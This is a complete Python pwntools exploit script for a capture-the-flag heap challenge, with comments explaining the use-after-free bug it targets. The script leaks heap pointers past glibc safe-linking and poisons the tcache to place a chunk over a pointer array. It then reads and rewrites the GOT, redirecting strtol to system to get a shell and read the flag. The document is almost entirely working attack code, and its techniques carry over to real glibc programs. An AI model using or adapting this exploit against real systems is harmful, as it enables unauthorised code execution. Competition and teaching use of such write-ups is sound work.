#!/usr/bin/env python3
# Sunshine CTF 2026 - Pwn/cache_money    (glibc 2.39, tcache, safe-linking)
#
# BUG: transfer() frees the source's ledger and THEN hands that same pointer to
# the destination wallet:
#     free(src->ledger);
#     dst->ledger = src->ledger;      <-- dangling
#     dst->size   = src->size;
# Deposit is read(0, ledger, size) and Withdraw is write(1, ledger, size), so the
# destination gets a full read AND write over a chunk sitting in tcache.
#
# LEAK WITHOUT OFFSETS: safe-linking stores (chunk >> 12) ^ next. Read the chunk
# while it is the ONLY entry in its bin and next == NULL, so the stored word is
# exactly chunk >> 12. Every chunk here lives in the heap's first page, so that
# one word is also the shift for any later chunk -- no hardcoded heap offsets.
#
# WHY NOT POINT A LEDGER AT THE GOT: open() memsets the new ledger, so landing a
# chunk on .got.plt zeroes it and the next printf jumps to 0. Instead the poisoned
# chunk lands on the WALLET POINTER ARRAY in .bss, where zeroing costs nothing.
# Deposit then rewrites that array so slot 0 points at a fake wallet struct built
# *inside the same write* -- self-referential, so no heap address is needed. That
# fake wallet has ledger = .got.plt with no memset in the way, giving a clean read
# (libc leak) and then a clean write (strtol@got -> system).
#
# main() dispatches on strtol(menu_buf), with rdi already = the buffer, so once
# strtol@got is system the next menu line is executed as a command.
import sys, re
from pwn import *

context.update(arch='amd64', log_level='info')
HOST, PORT = 'chal.sunshinectf.games', 26004
SZ         = 0x80          # ledger size: chunk 0x90, tcache-managed
WALLETS    = 0x4040c0      # qword_4040C0, the 16-entry wallet pointer array (16-aligned)
GOT        = 0x404000      # .got.plt: free, puts, write, __stack_chk_fail, ...
GOT_LEN    = 0x70          # 0x404000 .. 0x404070, stops before .data
STRTOL_OFF = 0x404040 - GOT
FAKE       = 0x404100      # fake struct, inside the array region we overwrite

remote_mode = len(sys.argv) > 1 and sys.argv[1] == 'remote'
io = remote(HOST, PORT) if remote_mode else process('./cache_money_patched')
libc = ELF('./libc.so.6', checksec=False)

def menu(choice):
    io.recvuntil(b'>>> ')
    io.sendline(str(choice).encode())

def open_wallet(name, size=SZ):
    menu(1)
    io.recvuntil(b'Wallet name: ');  io.sendline(name)
    io.recvuntil(b'size (0x20 - 0x100): '); io.sendline(str(size).encode())

def deposit(idx, data):
    menu(2)
    io.recvuntil(b'wallet? (0-15): '); io.sendline(str(idx).encode())
    io.recvuntil(b'transaction data: '); io.send(data)

def withdraw(idx, nbytes):
    menu(3)
    io.recvuntil(b'from which wallet? (0-15): '); io.sendline(str(idx).encode())
    io.recvuntil(b'bytes):\n    ')
    return io.recvn(nbytes)

def transfer(src, dst):
    menu(4)
    io.recvuntil(b'FROM which wallet? (0-15): '); io.sendline(str(src).encode())
    io.recvuntil(b'TO which wallet? (0-15): ');   io.sendline(str(dst).encode())

# ---- 1. four wallets, then two transfers to seed tcache[0x90] with two chunks.
for n in (b'A', b'B', b'C', b'D'):
    open_wallet(n)

transfer(0, 1)                      # free(LA); wallet1.ledger = LA   (count 1)
raw = withdraw(1, 16)
heap_shift = u64(raw[0:8])          # next == NULL, so this is exactly LA >> 12
tcache_key = u64(raw[8:16])         # random per-process since glibc 2.34, not a pointer
log.success(f'heap >> 12      = {heap_shift:#x}   (heap base {heap_shift << 12:#x})')
log.info(f'tcache key      = {tcache_key:#x} (random, only proves the chunk is in tcache)')
assert heap_shift and tcache_key, 'chunk does not look like a freed tcache entry'

transfer(2, 3)                      # free(LC); wallet3.ledger = LC   (count 2, LC at head)
log.info('tcache[0x90] seeded with 2 chunks, head is reachable via wallet 3')

# ---- 2. poison the head's next. Same page as LA, so the shift is identical.
deposit(3, p64(heap_shift ^ WALLETS))
log.success(f'tcache head -> {WALLETS:#x} (wallet array)')

# ---- 3. two allocations: the real chunk, then the array itself.
open_wallet(b'E')                   # pops LC
open_wallet(b'F')                   # pops WALLETS; memset zeroes all 16 slots,
                                    # then slot 5 is restored to F's own struct
log.success('ledger allocated over the wallet array')

# ---- 4. rewrite the array so slot 0 is a wallet whose ledger is the GOT.
fake  = b'SH'.ljust(16, b'\x00')    # +0  name (printed with %s)
fake += p64(0)                      # +16 balance
fake += p64(GOT)                    # +24 ledger  -> .got.plt
fake += p64(GOT_LEN)                # +32 size
fake += p32(1)                      # +40 active
array = flat({0x00: FAKE, FAKE - WALLETS: fake}, filler=b'\x00', length=SZ)
deposit(5, array)
log.success('slot 0 now points at a fake wallet with ledger = .got.plt')

# ---- 5. read the GOT through it -- no memset on this path, so it survives.
got = withdraw(0, GOT_LEN)
# Use the plain syscall wrappers (write @ 0x404010, read @ 0x404028): strcspn and
# friends are ifunc-dispatched to SIMD variants, so their slots do not match the
# generic symbol. Two independent slots agreeing on one page-aligned base is the
# libc-identity check.
bases = {s: u64(got[o:o + 8]) - libc.symbols[s]
         for s, o in (('write', 0x10), ('read', 0x28))}
for s, b in bases.items():
    log.info(f'{s:<6} -> base {b:#x}')
assert len(set(bases.values())) == 1 and bases['read'] & 0xfff == 0, \
    f'libc mismatch {[hex(b) for b in bases.values()]} - wrong libc'
libc.address = bases['read']
log.success(f'libc base   = {libc.address:#x}')
log.success(f'system      = {libc.symbols["system"]:#x}')

# ---- 6. write it back with only strtol swapped for system.
patched = bytearray(got)
patched[STRTOL_OFF:STRTOL_OFF + 8] = p64(libc.symbols['system'])
deposit(0, bytes(patched))
log.success('strtol@got -> system')

# ---- 7. main dispatches on strtol(menu_buf), and rdi is already that buffer.
io.recvuntil(b'>>> ')
io.sendline(b'/bin/sh')
io.recvrepeat(0.5)
io.sendline(b'cat flag*.txt flag* 2>/dev/null; ls')
out = io.recvrepeat(2).decode('latin1')
print(out)
m = re.search(r'sun\{[^}]*\}', out)
if m:
    log.success(f'FLAG: {m.group(0)}')
else:
    io.interactive()
